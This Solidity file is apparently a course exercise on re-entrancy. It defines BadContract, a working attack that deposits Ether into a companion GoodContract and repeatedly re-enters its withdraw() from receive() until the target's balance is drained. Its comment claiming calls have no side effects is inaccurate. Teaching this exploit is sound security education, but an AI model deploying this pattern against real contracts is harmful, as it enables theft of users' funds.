// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

/// @title Contract for https://www.learnweb3.io/tracks/senior/re-entrancy
/// @author Olivier Winkler
/// @dev All function calls are currently implemented without side effects
contract BadContract {
    GoodContract public goodContract;

    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
